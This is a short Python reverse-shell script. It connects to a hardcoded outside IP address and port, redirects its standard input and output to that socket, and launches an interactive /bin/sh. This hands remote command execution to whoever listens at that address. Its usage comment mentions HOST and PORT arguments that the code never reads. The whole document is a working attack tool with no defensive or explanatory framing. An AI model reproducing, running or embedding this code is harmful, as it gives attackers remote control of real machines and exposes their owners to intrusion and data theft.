#!/usr/bin/python
#Usage: python filename.py HOST PORT
import sys, socket, os, subprocess

iplo = "54.39.23.246"
portlo = 2234

socket.setdefaulttimeout(60)

def pybackconnect():
  try:
    jmb = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    jmb.connect((iplo,portlo))
    os.dup2(jmb.fileno(),0)
    os.dup2(jmb.fileno(),1)
    os.dup2(jmb.fileno(),2)
    os.dup2(jmb.fileno(),3)
    shell = subprocess.call(["/bin/sh","-i"])
  except socket.timeout:
    print("TimOut")
  except socket.error as e:
    print("Error", e)
  
pybackconnect()
